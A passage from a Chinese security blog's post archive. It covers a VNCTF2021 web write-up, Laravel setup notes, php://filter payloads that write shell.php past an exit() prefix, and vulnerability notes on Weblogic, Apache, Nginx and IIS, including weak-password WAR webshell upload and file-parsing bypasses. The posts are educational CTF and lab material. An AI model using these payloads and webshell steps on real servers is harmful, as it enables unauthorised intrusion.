48z120M53A49S57s55K120o50o10u32y32k32j32u125a59j10u32S32S32n32p95A48s120k53a49M57F55J120J54G32c61R32l95c48X120C53s49q57U55V120E52N40A95t95T79x120Q97R50o55F56e49Y91i48G120p97P93y44S32J95k48r120q53g49i57E55x120D52O40N95H48S120d53i49M57H55x120e52e40X95k95Z79q120C97l50T55K56I49k91R48o120g98g93Q44v32r95R95K79W120N97u50A55v56Z49m91A48x120X99H93x41y44T32w95n95v79i120g97E50y55h56m49C91X48S120N100w93n41q41b59M10I32e32F32g32e116J114t121I32r123N10M32J32N32m32j32l32J32g32X95n48g120l53X49b57l55D120p50s32b61T32f95W95E101N110o99c111M100M101Q59f10J32k32y32K32B32F32X32R32K105d102c32b40e33U40o116q121j112D101A111D102c32x95p48o120R53a49b57S55d120M50d32p33q61s61o32d95z48B120A53s49S57t55a120j55H32B38S38e32N95i48L120O53j49W57O55V120P50X32o61Y61i61k32P95j48M120Z53O49t57W55P120p52V40d95N95y79a120X97r50t55o56v49a91I48m120m101p93B44T32V95b95j79s120M97q50p55j56G49A91g48i120O102U93G41y41a41i32F123F10O32Z32o32T32P32e32Z32K32T32h32z32d32b95l48V120H53v49J57I55L120w53J40n95M48o120F53C49d57W55e120S54R41U10U32u32C32c32x32z32y32J32F125L10H32K32G32r32d125e32A99A97l116x99y104R32H40B101U41W32j123A10m32t32b32L32A32A32B32D32Z95t48z120m53V49N57N55B120x53Z40m95k48c120A53L49M57V55R120l54U41X10E32R32G32Q32q125U10D125p41P40A123E125S41&quot;[&#39;\x73\x70\x6c\x69\x74&#39;](&#x2F;[a-zA-Z]&#123;1,&#125;&#x2F;))))(&#39;sojson.v4&#39;);</span><br></pre></td></tr></table></figure>

<p>sojson.v4加密 在 <a href="http://oa.xiximiao.com/tools/_jsDec/index.html%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86">http://oa.xiximiao.com/tools/_jsDec/index.html进行解密</a></p>
<p><img src="/2021/03/29/VNCTF2021-web/3.png" alt="3"></p>
<h4 id="思路2"><a href="#思路2" class="headerlink" title="思路2"></a>思路2</h4><p>直接把加密内容丢控制台</p>
<p><img src="/2021/03/29/VNCTF2021-web/4.png" alt="4"></p>
<h4 id="思路3"><a href="#思路3" class="headerlink" title="思路3"></a>思路3</h4><p>在geme.js我们会发现一些代码，对应血量、血量上限、小回旋镖数量、大回旋镖数量、金币数量。</p>
<p><img src="/2021/03/29/VNCTF2021-web/5.png" alt="5"></p>
<p>我们可以在控制台修改响应值，玩游戏通过就行了</p>
<p><img src="/2021/03/29/VNCTF2021-web/6.png" alt="6"></p>
<h4 id="思路4"><a href="#思路4" class="headerlink" title="思路4"></a>思路4</h4><p><img src="/2021/03/29/VNCTF2021-web/7.png" alt="7"></p>
<p>网上人家说的这个地方在控制台输入winTimer.Set();即可拿到flag</p>
<p><img src="/2021/03/29/VNCTF2021-web/8.png" alt="8"></p>
<p>或者winTimer[“endTime”] =99也可以</p>
<h4 id="思路5"><a href="#思路5" class="headerlink" title="思路5"></a>思路5</h4><p>关键函数NextLevel()，一直跳下一关。。。</p>
<h2 id="naive"><a href="#naive" class="headerlink" title="naive"></a>naive</h2><p>这个真真不会，没有学过。</p>
<p><a href="https://blog.csdn.net/solitudi/article/details/114849641?spm=1001.2014.3001.5501%E6%9A%82%E6%97%B6%E4%B8%8D%E4%BC%9A%EF%BC%8C%E7%AD%89%E5%AD%A6%E4%B9%A0nodejs%E5%86%8D%E7%9C%8B%E7%9C%8B%E3%80%82">https://blog.csdn.net/solitudi/article/details/114849641?spm=1001.2014.3001.5501暂时不会，等学习nodejs再看看。</a></p>
<p><a href="https://www.icode9.com/content-4-891931.html">https://www.icode9.com/content-4-891931.html</a></p>
<h2 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h2>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>VNCTF2021-web</tag>
      </tags>
  </entry>
  <entry>
    <title>Laravel</title>
    <url>/2022/04/04/Laravel/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Laravel 是一个 Web应用框架，php作为底层语言，能够有很好的扩展，拥有比较完善的软件包。</p>
<p>3大核心：路由，控制器，视图</p>
<p>中文官方：<strong><a href="https://learnku.com/docs/laravel/8.x">https://learnku.com/docs/laravel/8.x</a></strong></p>
<a id="more"></a>

<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ol>
<li>composer下载 ：<a href="https://getcomposer.org/download/">https://getcomposer.org/download/</a></li>
</ol>
<p>安装目录下执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo @php &quot;%~dp0composer.phar&quot; %*&gt;composer.bat</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">composer -V</span><br><span class="line"></span><br><span class="line">换源</span><br><span class="line">国内：</span><br><span class="line"><span class="comment"># composer config -g repo.packagist composer https://packagist.phpcomposer.com</span></span><br><span class="line">或</span><br><span class="line"><span class="comment"># composer config -g repo.packagist composer https://packagist.laravel-china.org  （这个可能有时会报错）</span></span><br><span class="line"></span><br><span class="line">国外官方：</span><br><span class="line">composer config -g repo.packagist composer https://packagist.org </span><br></pre></td></tr></table></figure>

<ol start="2">
<li>从<a href="https://laravelacademy.org/post/2%E4%B8%8B%E8%BD%BD%E6%A1%86%E6%9E%B6">https://laravelacademy.org/post/2下载框架</a></li>
</ol>
<p>或者</p>
<p>利用composer直接下载，在phpstudy 的www目录下执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">composer create-project --prefer-dist  laravel&#x2F;laravel laravel8  #创建laravel8文件，将框架下载到其中，不指定版本</span><br><span class="line"></span><br><span class="line">composer create-project --prefer-dist  laravel&#x2F;laravel laravel 7.x #指定版本</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/04/Laravel/image-20220404135443531.png" alt="image-20220404135443531"></p>
<p>phpstudy 配置：设置根目录到为public<br><img src="/2022/04/04/Laravel/image-20220404135516295.png" alt="image-20220404135516295"></p>
<p>访问如下图</p>
<p><img src="/2022/04/04/Laravel/image-20220404135640257.png" alt="image-20220404135640257"></p>
<p>以下代码分析均为<code>laravel8.83.6 </code>框架，目前laravel框架已经更新到9.x了</p>
<h1 id="框架结构"><a href="#框架结构" class="headerlink" title="框架结构"></a>框架结构</h1><p><a href="https://learnku.com/docs/laravel/8.x/structure/9356">https://learnku.com/docs/laravel/8.x/structure/9356</a></p>
<p>主要目录分析</p>
<p><img src="/2022/04/04/Laravel/image-20220404150632990.png" alt="image-20220404150632990"></p>
<h3 id="app"><a href="#app" class="headerlink" title="app"></a>app</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">整个laravel最主要部分，主要代码都在app目录下完成，包含了mvc三大模块</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/04/Laravel/image-20220404151946298.png" alt="image-20220404151946298"></p>
<ul>
<li>/app/Http</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">包含控制器，中间件，表单请求等，几乎所有请求处理都在这里</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/04/Laravel/image-20220404153320786.png" alt="image-20220404153320786"></p>
<ul>
<li>/app/Models</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">包含Eloquent 等模型文件，用于处理数据库操作实现。每个表都有对应的model类，通过模型方法进行数据表的增删改查。</span><br></pre></td></tr></table></figure>

<ul>
<li>/app/Http/Controllers/</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">控制器用于将相关的 HTTP 请求封装到一个类中进行处理，如同TP6一样，默认情况下，控制器没有分组，默认都存放在 app&#x2F;Http&#x2F;Controllers 目录下。</span><br></pre></td></tr></table></figure>

<p>控制器有类似tp的目录结构</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app</span><br><span class="line">├─Http </span><br><span class="line">│  ├─Controllers  控制器目录</span><br><span class="line">│  │  ├─admin  后台Admin模块</span><br><span class="line">│  │  │  ├─IndexController.php 后台首页控制器</span><br><span class="line">│  │  │  ├─CategoryController.php 分类管理控制器</span><br><span class="line">│  │  ├─home   前台Home模块</span><br><span class="line">│  │  │  ├─IndexController.php 前台首页控制器</span><br><span class="line">│  │  │  ├─ArticleController.php 文章展示控制器</span><br><span class="line">│  │  ├─user   用户User模块</span><br><span class="line">│  │  │  ├─IndexController.php 用户首页控制器</span><br><span class="line">│  │  │  ├─TagController.php 标签管理控制器</span><br></pre></td></tr></table></figure>



<h3 id="bootstrap"><a href="#bootstrap" class="headerlink" title="bootstrap"></a>bootstrap</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">存放所有的第三方代码，包括框架函数源码（&#x2F;vendor&#x2F;laravel）、插件和扩展等。</span><br></pre></td></tr></table></figure>

<h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">网站入口，存放对外开放的资源目录，</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/04/Laravel/image-20220404154958546.png" alt="image-20220404154958546"></p>
<h3 id="database"><a href="#database" class="headerlink" title="database"></a>database</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">数据库操作相关文件（数据库迁移和数据填充）</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/04/Laravel/image-20220404155250445.png" alt="image-20220404155250445"></p>
<h3 id="public"><a href="#public" class="headerlink" title="public"></a>public</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php进入程序请求的入口， 同时包含前端控制器和资源相关文件</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/04/Laravel/image-20220404155516021.png" alt="image-20220404155516021"></p>
<h3 id="resources"><a href="#resources" class="headerlink" title="resources"></a>resources</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">资源文件,前端显示内容，通常利用路由调用views里面的文件进行显示</span><br><span class="line"></span><br><span class="line">views 一般以xx.blade.php命名，</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/04/Laravel/image-20220404155645046.png" alt="image-20220404155645046"></p>
<h3 id="routes"><a href="#routes" class="headerlink" title="routes"></a>routes</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">通过配置路由，进行资源的访问，请求，页面的显示等</span><br><span class="line"></span><br><span class="line">web.php 文件包含 RouteServiceProvider 放置在 web 中间件组中的路由，后者提供会话状态、CSRF 保护和 cookie 加密。如果您的应用程序不提供无状态的 RESTful API，那么您的所有路由都很可能在 web.php 文件。</span><br><span class="line"></span><br><span class="line">api.php 文件包含 RouteServiceProvider 放置在 api 中间件组中的路由，后者提供速率限制。这些路由是无状态的，因此通过这些路由进入应用程序的请求将通过令牌进行身份验证，并且不能访问会话状态。</span><br><span class="line"></span><br><span class="line">console.php 文件是您可以定义所有基于闭包的控制台命令的地方。每个闭包都绑定到一个命令实例，允许使用一种简单的方法与每个命令的进行 IO 交互。尽管这个文件没有定义 HTTP 路由，但是它定义了应用程序中基于控制台的入口点（路由）。</span><br><span class="line"></span><br><span class="line">channels.php 文件是您可以注册应用程序支持的所有事件广播频道的位置。</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/2022/04/04/Laravel/image-20220405005017795.png" alt="image-20220405005017795"></p>
<h3 id="storage"><a href="#storage" class="headerlink" title="storage"></a>storage</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">编译后的视图、基于会话、文件缓存和其它框架生成的文件</span><br></pre></td></tr></table></figure>

<p><img src="/2022/04/04/Laravel/image-20220404155731350.png" alt="image-20220404155731350"></p>
<p>​    </p>
<h3 id="texts"><a href="#texts" class="headerlink" title="texts"></a>texts</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">应用测试相关文件</span><br></pre></td></tr></table></figure>



<h3 id="vendor"><a href="#vendor" class="headerlink" title="vendor"></a>vendor</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">需要调用的 依赖模块</span><br></pre></td></tr></table></figure>





<h3 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h3><p>.env</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DB_CONNECTION&#x3D;mysql</span><br><span class="line">DB_HOST&#x3D;127.0.0.1</span><br><span class="line">DB_PORT&#x3D;3306</span><br><span class="line">DB_DATABASE&#x3D;laravel    数据库名</span><br><span class="line">DB_USERNAME&#x3D;root       数据库账户</span><br><span class="line">DB_PASSWORD&#x3D;XXXX       数据库密码</span><br></pre></td></tr></table></figure>

<p>/config—&gt;database.php</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;mysql&#39; &#x3D;&gt; [</span><br><span class="line">    &#39;driver&#39; &#x3D;&gt; &#39;mysql&#39;,</span><br><span class="line">    &#39;url&#39; &#x3D;&gt; env(&#39;DATABASE_URL&#39;),</span><br><span class="line">    &#39;host&#39; &#x3D;&gt; env(&#39;DB_HOST&#39;, &#39;127.0.0.1&#39;),</span><br><span class="line">    &#39;port&#39; &#x3D;&gt; env(&#39;DB_PORT&#39;, &#39;3306&#39;),</span><br><span class="line">    &#39;database&#39; &#x3D;&gt; env(&#39;DB_DATABASE&#39;, &#39;laravel&#39;),</span><br><span class="line">    &#39;username&#39; &#x3D;&gt; env(&#39;DB_USERNAME&#39;, &#39;root&#39;),</span><br><span class="line">    &#39;password&#39; &#x3D;&gt; env(&#39;DB_PASSWORD&#39;, &#39;XXXX&#39;),</span><br><span class="line">    &#39;unix_socket&#39; &#x3D;&gt; env(&#39;DB_SOCKET&#39;, &#39;&#39;),</span><br><span class="line">    &#39;charset&#39; &#x3D;&gt; &#39;utf8mb4&#39;,</span><br><span class="line">    &#39;collation&#39; &#x3D;&gt; &#39;utf8mb4_unicode_ci&#39;,</span><br></pre></td></tr></table></figure>







<h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><h3 id="基础路由"><a href="#基础路由" class="headerlink" title="基础路由"></a>基础路由</h3><p>routes文件下进行</p>
<ul>
<li>基本用法</li>
</ul>
<p>routes/web.php添加，  </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;test&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;hello Laravel&quot;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p> url/test    ，进行访问</p>
<p>​    <img src="/2022/04/04/Laravel/image-20220405002141084.png" alt="image-20220405002141084"></p>
<p>另外一种用法,利用闭包函数，（例如视图文件），</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Route::get(<span class="string">&#x27;/we&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> view(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>视图文件在resouces/views/中welcome.blade.php</p>
<p><img src="/2022/04/04/Laravel/image-20220405003140886.png" alt="image-20220405003140886"></p>
<p>访问(<a href="http://127.0.0.1:10001/we">http://127.0.0.1:10001/we</a>)</p>
<p><img src="/2022/04/04/Laravel/image-20220405003209479.png" alt="image-20220405003209479"></p>
<p>还有更多的路由请求方式就不在叙述了（<a href="https://laravelacademy.org/post/21970%EF%BC%89%E6%AF%95%E7%AB%9F%E6%88%91%E4%B8%8D%E6%98%AF%E5%BC%80%E5%8F%91%E5%95%8A">https://laravelacademy.org/post/21970）毕竟我不是开发啊</a> </p>
<ul>
<li>在api.php下定义的路由需要加上/api/</li>
</ul>
<p><img src="/2022/04/04/Laravel/image-20220405003738965.png" alt="image-20220405003738965"></p>
<p><a href="http://127.0.0.1:10001/api/testapi">http://127.0.0.1:10001/api/testapi</a></p>
<p><img src="/2022/04/04/Laravel/image-20220405003809337.png" alt="image-20220405003809337"></p>
<p>等等等</p>
<h3 id="laravel8-的路由用法的变化"><a href="#laravel8-的路由用法的变化" class="headerlink" title="laravel8 的路由用法的变化"></a>laravel8 的路由用法的变化</h3><p>laravel7等Laravel旧版本中，RouteServiceProvider类中包含$namespace属性，值为AppHttpControllers，此属性可自动为路由添加AppHttpControllers前缀。</p>
<p>即直接进行下面方式路由配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Route::get(&#39;login&#39;, &#39;LoginControl@index&#39;);</span><br></pre></td></tr></table></figure>



<p>laravel8.x 中该属性值默认为null，路由中只能使用标准PHP调用语法（需填写controller全路径）</p>
<p><img src="/2022/04/04/Laravel/image-20220405001507199.png" alt="image-20220405001507199"></p>
<p>方法1：取消<code>protected $namespace = &#39;App\\Http\\Controllers&#39;;</code>注释</p>
<p>方法2：在进行下面路由配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use App\Http\Controllers\LoginControl;      </span><br><span class="line"></span><br><span class="line">Route::get(&#39;login&#39;, [LoginControl::class, &#39;index&#39;]);</span><br></pre></td></tr></table></figure>



<h3 id="创建新控制器文件"><a href="#创建新控制器文件" class="headerlink" title="创建新控制器文件"></a>创建新控制器文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php artisan make:controller  LoginController</span><br></pre></td></tr></table></figure>





<h3 id="简单实例应用路由调用控制器"><a href="#简单实例应用路由调用控制器" class="headerlink" title="简单实例应用路由调用控制器"></a>简单实例应用路由调用控制器</h3><ul>
<li></li>
</ul>
<p>这边不知道为啥环境有问题，，，，一直报错。</p>
<p>参考:</p>
<p><a href="https://cloud.tencent.com/developer/article/1723191">https://cloud.tencent.com/developer/article/1723191</a>      Laravel框架分析</p>
<p><a href="https://mp.weixin.qq.com/s/aFGw2fPgjoSTD6zK_j-oHA">https://mp.weixin.qq.com/s/aFGw2fPgjoSTD6zK_j-oHA</a>    零基础学习laravel8 </p>
<p><a href="https://blog.csdn.net/wjcms/article/details/109016643">https://blog.csdn.net/wjcms/article/details/109016643</a>   laravel8更新之路由调整</p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>Laravel框架学习</tag>
      </tags>
  </entry>
  <entry>
    <title>blog迁移</title>
    <url>/2022/06/13/blog%E8%BF%81%E7%A7%BB/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>file_put_content利用(php://filter协议)</title>
    <url>/2020/10/25/file-put-contents%E5%88%A9%E7%94%A8-php-filter%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<hr>
<h3 id="0×01"><a href="#0×01" class="headerlink" title="0×01"></a>0×01</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(_FILE_);</span><br><span class="line">chdir(<span class="string">&quot;sandbox&quot;</span>);</span><br><span class="line">$filename = $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">$data  = <span class="string">&#x27;&lt;?php exit(); ?&#x27;</span>. $filename;</span><br><span class="line">file_put_content($filename,$data);</span><br></pre></td></tr></table></figure>



<p><code>exit</code>加在filename前面，会导致写入的内容不能执行。（利用php base64_decode函数特性去除“死亡exit”）</p>
<a id="more"></a>

<blockquote>
<p>Payload:     </p>
<p>/?file=filter/write=convert.base64-deconde|aPD9waHAgcGhwaW5mbygpOz8+/recource=shell.php </p>
<p>/?file = php://filter/write=string.rot13|<code>&lt;?cuc cucvasb();?&gt;</code>/resource=shell.php    rot13编码</p>
</blockquote>
<h3 id="0×02"><a href="#0×02" class="headerlink" title="0×02"></a>0×02</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$content = <span class="string">&#x27;&lt;?php exit; ?&gt;&#x27;</span>;</span><br><span class="line">$content .= $_POST[<span class="string">&#x27;txt&#x27;</span>];</span><br><span class="line">file_put_contents($_POST[<span class="string">&#x27;filename&#x27;</span>], $content);</span><br></pre></td></tr></table></figure>



<p>base64可打印（A-Z a-z 0-9 +/）<code>=</code>补位  ,遇到不符合的字符会跳过，所以&lt; ? ; ? &gt;; 和空格 七个字符不符合，</p>
<p>最终解码只有<code>phpexit</code>7个字符，base64解码是4个一组的，所有要在shell前面加个a,</p>
<blockquote>
<p>Payload: </p>
<p>/?txt=aPD9waHAgcGhwaW5mbygpOz8+&amp;filename=php://filter/write=convert.base64-deconde/resource=shell.php       //PD9waHAgcGhwaW5mbygpOz8+前面要多加一个a</p>
</blockquote>
<hr>
<p>参考博客：<a href="https://www.cnblogs.com/vege/p/12650702.html">https://www.cnblogs.com/vege/p/12650702.html</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>file_put_content</tag>
      </tags>
  </entry>
  <entry>
    <title>middleware</title>
    <url>/2022/03/20/middleware-java/</url>
    <content><![CDATA[<h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><p>默认端口：<code>7001</code></p>
<p>部分历史漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 弱口令&#x2F;任意文件读取+后台war包&#x2F;任意文件上传getshell</span><br><span class="line">2. CVE-2017-20271</span><br><span class="line">3. CVE-2018-2628</span><br><span class="line">4. CVE-2019-2725</span><br><span class="line">5. CVE-2020-2555</span><br><span class="line">6. CVE-2021-2394</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>WebLogic是<a href="https://baike.baidu.com/item/%E7%BE%8E%E5%9B%BDOracle%E5%85%AC%E5%8F%B8/9952086">美国Oracle公司</a>出品的一个application server，确切的说是一个基于<a href="https://baike.baidu.com/item/JAVAEE/3066623">JAVAEE</a>架构的<a href="https://baike.baidu.com/item/%E4%B8%AD%E9%97%B4%E4%BB%B6/452240">中间件</a>，WebLogic是用于<a href="https://baike.baidu.com/item/%E5%BC%80%E5%8F%91/9400971">开发</a>、集成、部署和管理大型分布式Web应用、<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/2196523">网络应用</a>和<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%BA%94%E7%94%A8/10563731">数据库应用</a>的Java<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E6%9C%8D%E5%8A%A1%E5%99%A8">应用服务器</a>。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
<p>WebLogic Server具有开发和部署关键任务电子商务Web应用系统 所需的多种特色和优势。</p>
<a id="more"></a>

<p>weblogic是java EE的应用服务器（application server），包括ejb ,jsp,servlet,jms等等，全能型的。是商业软件里排名第一的容器（JSP、servlet、EJB等），并提供其他如JAVA编辑等工具，是一个综合的开发及运行环境。(收费)</p>
<!--more-->

<p><img src="/2022/03/20/middleware-java/image-20220323214802592.png" alt="image-20220323214802592"></p>
<p>以下环境为vulhub靶场环境</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub.git</span><br></pre></td></tr></table></figure>



<h2 id="弱口令-上传war包"><a href="#弱口令-上传war包" class="headerlink" title="弱口令+上传war包"></a>弱口令+上传war包</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>weblogic搭建完后没有修改后台登陆密码/后台登陆为弱口令</p>
<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>启动环境</p>
<p><img src="/2022/03/20/middleware-java/image-20220324002901248.png" alt="image-20220324002901248"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.119.165:7001&#x2F;console       访问后台</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/20/middleware-java/image-20220324010752442.png" alt="image-20220324010752442"></p>
<p>weblogic/Oracle@123登陆后台（bp爆破，密码错五次就会禁止认证）</p>
<p>弱口令参考：<a href="https://cirt.net/passwords?criteria=WebLogic">Default Passwords | CIRT.net</a></p>
<p>下面要准备war包上传</p>
<p><img src="/2022/03/20/middleware-java/image-20220324011153236.png" alt="image-20220324011153236"></p>
<p>点上传文件</p>
<p><img src="/2022/03/20/middleware-java/image-20220324011308204.png" alt="image-20220324011308204"></p>
<p>将jsp马（哥斯拉生成jsp）打包成war包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar -cvf shell.war 1.jsp</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/20/middleware-java/image-20220324011818173.png" alt="image-20220324011818173"></p>
<p>然后一直下一步，完成</p>
<p><img src="/2022/03/20/middleware-java/image-20220324011923927.png" alt="image-20220324011923927"></p>
<p>成功上传</p>
<p><img src="/2022/03/20/middleware-java/image-20220324012109060.png" alt="image-20220324012109060"></p>
<p>访问：<a href="http://192.168.119.165:7001/shell/1.jsp">http://192.168.119.165:7001/shell/1.jsp</a> ，shell连接</p>
<p><img src="/2022/03/20/middleware-java/image-20220324014607221.png" alt="image-20220324014607221"></p>
<p><img src="/2022/03/20/middleware-java/image-20220324014649096.png" alt="image-20220324014649096"></p>
<p>参考：<a href="https://xz.aliyun.com/t/9932#toc-4">weblogic漏洞大杂烩 - 先知社区 (aliyun.com)</a></p>
<p>工具：(<a href="https://github.com/0xn0ne/weblogicScanner">https://github.com/0xn0ne/weblogicScanner</a>)</p>
<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><h1 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h1><ol>
<li>jboss/jboss +war上传</li>
</ol>
<h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h3 id="HTTPD-换行解析漏洞"><a href="#HTTPD-换行解析漏洞" class="headerlink" title="HTTPD 换行解析漏洞"></a>HTTPD 换行解析漏洞</h3><p>CVE-2017-15715     2.4.0~2.4.29</p>
<p><code>/phpinfo.php%0a</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch \.php$&gt; </span><br><span class="line">	SetHandler application&#x2F;x-httpd-php </span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>$符号不仅匹配字符串结尾位置，也可以匹配\n 或 \r。 导致/phpinfo.php\x0A能够被解析</p>
<p>上传 xxx.php%0a 绕过后缀限制。</p>
<p>访问： xxx.com/phpinfo.php%0a 即可</p>
<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><p>配置文件错误导致 正常123.jpg    访问时候  .com/123.jpg/xxxxxx.php      123.jpg会以php形式解析</p>
<p>漏洞配置如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123; </span><br><span class="line">	location ~ \.php$ &#123; </span><br><span class="line">		root            &#x2F;work&#x2F;www&#x2F;test; </span><br><span class="line">		fastcgi_index   index.php; </span><br><span class="line">		fastcgi_param   SCRIPT_FILENAME </span><br><span class="line">		$document_root  $fastcgi_script_name; </span><br><span class="line">		include         fastcgi_params; </span><br><span class="line">		fastcgi_pass    unix:&#x2F;tmp&#x2F;php-fpm.sock; </span><br><span class="line">		&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>com/123.jpg/xxxxxx.php    首先<code>PHP fastcgi</code> 进行处理，但找不到xxxxxx.php，</p>
<p>又由于<code>cgi.fix_pathinfo</code>默认是开启的，因此PHP 会继续检查路径中存在的文件，并将 </p>
<p>多余的部分当作 PATH_INFO。接着PHP在文件系统中找到.jpg文件，而后以PHP的形式执行.jpg的内容，并将/xxx.php存储在 PATH_INFO 后丢弃</p>
<h1 id="IIs"><a href="#IIs" class="headerlink" title="IIs"></a>IIs</h1><h3 id="IIS-6-0-解析漏洞"><a href="#IIS-6-0-解析漏洞" class="headerlink" title="IIS 6.0 解析漏洞"></a>IIS 6.0 解析漏洞</h3><p>（*.asp;.jpg             *.asp/test.jpg   ）</p>
<ul>
<li><p>*.asp;.jpg ，服务器默认不解析<code>;</code>后面的内容。</p>
</li>
<li><p>*.asp/目录下的文件被当作asp解析。</p>
</li>
</ul>
<h3 id="IIS7-x-文件解析漏洞"><a href="#IIS7-x-文件解析漏洞" class="headerlink" title="IIS7.x  文件解析漏洞"></a>IIS7.x  文件解析漏洞</h3><p> (test.jpg/.php)</p>
<ul>
<li>在IIS7/7.5 FastCGI运行模式下，在任意文件，例：test.jpg后面加上/.php，会将test.jpg 解析为php文件。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原因cgi.fix_pathinfo&#x3D;1</span><br></pre></td></tr></table></figure>



<h3 id="IIS-6-0-PUT漏洞"><a href="#IIS-6-0-PUT漏洞" class="headerlink" title="IIS 6.0 PUT漏洞"></a>IIS 6.0 PUT漏洞</h3><ul>
<li>IIS的 Web 服务扩展中开启了 WebDAV之后，<code>支持多种请求</code>，配合写入权限，可造成任意文件写入(PUT写 webshell)。</li>
</ul>
<h3 id="短文件名"><a href="#短文件名" class="headerlink" title="短文件名"></a>短文件名</h3><ul>
<li>为了兼容<code>16</code>位<code>MS-DOS</code>程序，Windows为文件名较长的文件（和文件夹）生成了对应的<code>Windows 8.3</code>短文件名。</li>
</ul>
<p>​        </p>
<p>​                                                          左边短文件名                右边文件名</p>
<p><img src="/2022/03/20/middleware-java/image-20220415203407334.png" alt="image-20220415203407334"></p>
